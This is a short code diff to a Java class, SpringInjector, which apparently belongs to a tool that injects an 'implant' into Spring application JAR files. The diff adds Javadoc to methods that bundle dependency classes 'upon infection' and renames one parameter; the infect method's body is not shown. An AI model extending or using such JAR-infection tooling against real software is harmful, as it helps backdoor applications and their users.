@@ -24,17 +24,39 @@ public class SpringInjector {
         this.implantSpringConfigHandler = implantSpringConfigHandler;
     }
 
+    /**
+     * Add a class to be included in the JAR upon infection.
+     * This is good for any dependencies that the implant needs.
+     * The name for the entry will be derived from the ClassFile instance.
+     *
+     * @param classData ClassFile instance
+     * @throws IOException If the ClassFile cannot be serialized
+     */
     public void addDependency(ClassFile classData) throws IOException {
         addDependency(ByteBuffer.wrap(asByteArray(classData)), classData.getName());
     }
 
+    /**
+     * Add a class to be included in the JAR upon infection.
+     * This is good for any dependencies that the implant needs.
+     *
+     * @param classData     Raw bytes representing the content of the class file
+     * @param fullClassName The full name of the class, like "com.example.MyLib"
+     */
     public void addDependency(byte[] classData, String fullClassName) {
         addDependency(ByteBuffer.wrap(classData), fullClassName);
     }
 
-    public void addDependency(ByteBuffer rawClassData, String fullClassName) {
+    /**
+     * Add a class to be included in the JAR upon infection.
+     * This is good for any dependencies that the implant needs.
+     *
+     * @param classData     Raw bytes representing the content of the class file
+     * @param fullClassName The full name of the class, like "com.example.MyLib"
+     */
+    public void addDependency(ByteBuffer classData, String fullClassName) {
         String pathInJar = convertToJarEntryPathName(fullClassName);
-        dependencies.put(pathInJar, rawClassData);
+        dependencies.put(pathInJar, classData);
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
